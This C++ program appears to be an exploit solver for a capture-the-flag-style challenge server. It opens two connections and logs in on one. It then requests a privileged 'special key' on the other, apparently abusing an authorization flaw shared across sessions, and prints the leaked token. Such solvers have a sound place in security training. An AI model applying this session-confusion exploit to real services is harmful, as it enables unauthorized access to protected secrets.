#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <fstream>

#include <sys/types.h>
#include <netdb.h>

#include "Messages.h"

#define PORT "8888"

int main(int argc, char const *argv[])
{

  const char* portNum = std::getenv("PORT");
  if (nullptr == portNum) {
    portNum = PORT;
  }

  const char* hostName = std::getenv("HOST");
  if (nullptr == hostName) {
    std::cerr << "really needed a HOST environment variable" << std::endl;
    return -1;
  }

    struct addrinfo hints = {.ai_family = PF_UNSPEC,
                             .ai_socktype = SOCK_STREAM};
    struct addrinfo *res;
    struct addrinfo *res0;
    const char* cause = NULL;


    int addr_error = getaddrinfo(hostName, portNum, &hints, &res0);
    if (0 != addr_error) {
      std::cerr << "couldn't get address for " << hostName
                << ":\n"
                << gai_strerror(addr_error);
      return -1;
    }

        uint8_t buffer[1024] = {0};

        int sock1 = -1;
        int sock2 = -1;
        for (res = res0; res; res = res->ai_next) {
          sock1 = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
          if (sock1 < 0) {
            cause = "couldn't make socket";
            continue;
          }

          sock2 = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
          if (sock2 < 0)
            {
              cause = "couldn't make socket";
              ::close(sock1);
              sock1 = -1;
              continue;
            }

          if (connect(sock1,
                      res->ai_addr, res->ai_addrlen) < 0)
            {
              cause = "couldn't connect to challenge";
              ::close(sock1);
              sock1 = -1;

            }
          if (connect(sock2,
                      res->ai_addr, res->ai_addrlen) < 0)
            {
              cause = "couldn't connect to challenge";
              ::close(sock1);
              sock1 = -1;
              ::close(sock2);
              sock2 = -1;
            }


          break;
        }

        if ((sock1 < 0) || (sock2 < 0)) {
          std::cerr << "failed: " << cause << std::endl;
          return -1;
        }


    int amtRead = 0;
    ControlMessage *request = NULL;
    ControlMessage *response = NULL;

    request = makeLoginReqestMessage(0x111);
        send(sock1, request, request->messageSize, 0);
    free(request);
    request = NULL;

    amtRead = read(sock1 ,buffer, 1024);
    response = parseMessage(buffer, amtRead);
    free(response);
    response = NULL;

    request = makeSpecialKeyRequest();
        send(sock2, request, request->messageSize, 0);
    free(request);
    request = NULL;

    amtRead = read(sock2 ,buffer, 1024);
    response = parseMessage(buffer, amtRead);

    if (response && response->messageType != SPECIAL_KEY_RESPONSE)
    {
        printf("There was no bug\n");
        return -1;
    }

    SpecialKeyResponse *skr = (SpecialKeyResponse *)(response + 1);
    printf("TOKEN=%s\n", skr->key);

    close(sock1);
    close(sock2);
    return 0;
}
